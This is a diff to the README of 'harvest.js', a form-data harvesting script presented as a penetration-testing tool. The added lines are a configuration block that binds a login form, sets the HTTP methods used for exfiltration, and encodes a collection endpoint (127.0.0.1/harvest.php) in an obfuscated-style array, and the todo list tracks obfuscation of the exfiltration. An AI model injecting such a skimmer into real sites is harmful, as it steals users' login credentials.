@@ -9,12 +9,21 @@ A tool for pen testers to use in an engagement where data must be captured from 
 1. Identify target page and form to harvest data from
 2. Add harvest.js to the target page
 3. Update the settings in harvest.js
-4. Listen. . .
+'''
+//var siteId = "updateme";
+//var formId = "updateme";
+var bindAllFormsSwitch = true;
+var formName = "loginform2";
+var enableEncoding = true;
+var usePost = false;
+var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
+'''
+5. Listen. . .
 # todo list
 * ~~dynamic form binding and processing~~
 * ~~support for exfiltration through configurable HTTP methods~~
-* use hash values to identify site and form IDs
+* ~~use hash values to identify site and form IDs~~
 * ~~ability to bind multiple forms dynamically~~
 * code obfuscation
 * obfuscation for data exfiltration
-* remove jQuery dependency (maybe?)
+* remove jQuery dependencies
